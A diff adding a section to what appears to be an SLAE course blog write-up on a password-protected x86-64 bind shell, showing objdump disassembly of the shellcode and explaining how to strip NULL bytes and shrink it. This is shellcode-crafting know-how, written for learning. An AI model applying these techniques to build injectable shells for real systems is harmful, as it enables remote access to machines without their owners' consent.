@@ -281,6 +281,50 @@ If the password is incorrect, program will exit with a Segmentation Fault:
 
 <img src="https://galminyana.github.io/img/A01_BindShell-Execve-Stack_Exec03.png" width="75%" height="75%">
 
+## Remove NULLs and Reduce Shellcode Size
+---
+
+The actual shellcode has several NULLs and a size of 274 bytes (too much!). With `objdump` we can get the opcodes and review the NULLs in the shellcode:
+
+```markdown
+SLAE> objdump -M intel -d BindShell-ExecveStack.o
+
+BindShell-ExecveStack.o:     formato del fichero elf64-x86-64
+
+Desensamblado de la sección .text:
+
+[...]
+
+0000000000000012 <real_start>:
+  **12:	b8 29 00 00 00       	mov    eax,0x29**
+  **17:	bf 02 00 00 00       	mov    edi,0x2**
+  **1c:	be 01 00 00 00       	mov    esi,0x1**
+  **21:	ba 00 00 00 00       	mov    edx,0x0**
+  26:	0f 05                	syscall 
+  28:	48 89 c7             	mov    rdi,rax
+  2b:	48 31 c0             	xor    rax,rax
+  2e:	50                   	push   rax
+  **2f:	c7 44 24 fc 00 00 00 	mov    DWORD PTR [rsp-0x4],0x0**
+  **36:	00 **
+  37:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
+  **3e:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2**
+  45:	48 83 ec 08          	sub    rsp,0x8
+  **49:	b8 31 00 00 00       	mov    eax,0x31**
+  4e:	48 89 e6             	mov    rsi,rsp
+  **51:	ba 10 00 00 00       	mov    edx,0x10**
+[...]
+```
+
+`objdump`dump shows instructions that use NULLs (in **bold** on the capture). First step is removing the NULLs replacing instructions that put 0x00 in the shellcode by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
+
+- `mov rax, VALUE` is replaced by `push VALUE; pop rax`
+- `mov [rsp], VALUE` is replaced by `push VALUE`
+- Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
+
+Let's replace all instructions until no NULLs are shown by `objdump` in the shellcode.
+
+Also, the original code is using Relative Addressing for the Password Stuff. This is using bytes for the strings (as they are in the code section of the program), and the `lea` instruction has a opcode that uses 7 bytes. Also let's use the Stack for the Password Stuff.
+
 
 
  
